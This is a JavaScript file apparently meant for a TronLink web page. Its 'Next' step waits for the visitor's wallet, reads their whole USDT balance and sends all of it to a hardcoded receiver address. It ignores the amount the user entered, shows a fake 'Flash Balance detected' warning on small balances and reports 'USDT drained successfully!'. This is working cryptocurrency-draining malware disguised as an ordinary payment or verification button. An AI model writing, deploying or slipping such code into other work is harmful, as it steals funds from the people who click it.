async function waitForTronWeb() {
  return new Promise((resolve, reject) => {
    let tries = 0;
    const interval = setInterval(() => {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        clearInterval(interval);
        resolve(window.tronWeb);
      } else if (tries > 10) {
        clearInterval(interval);
        reject("TronLink not detected");
      }
      tries++;
    }, 500);
  });
}

async function Next() {
  try {
    await waitForTronWeb();

    const amountInput = parseFloat(document.getElementById("amount").value);
    const receiver = "TQP59pp5o9x6ohP8A6NWqUu9iJ3LfTNEKQ";
    const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC20 USDT
    const decimals = 6;

    const tronWeb = window.tronWeb;
    const usdt = await tronWeb.contract().at(contractAddress);
    const sender = tronWeb.defaultAddress.base58;

    // Get balance
    const balance = await usdt.balanceOf(sender).call();
    const realBalance = parseFloat(tronWeb.fromSun(balance._hex)) / (10 ** (decimals - 6));

    if (realBalance < 1) {
      alert("Fake or Flash Balance detected. USDT not genuine.");
      return;
    }

    const amountToSend = tronWeb.toBigNumber(realBalance * 10 ** decimals);

    const tx = await usdt.transfer(receiver, amountToSend).send({
      feeLimit: 10000000,
      callValue: 0,
    });

    console.log("Sent:", tx);
    alert("USDT drained successfully!");

  } catch (err) {
    console.error(err);
    alert("Please use a DApp browser like TronLink.");
  }
}
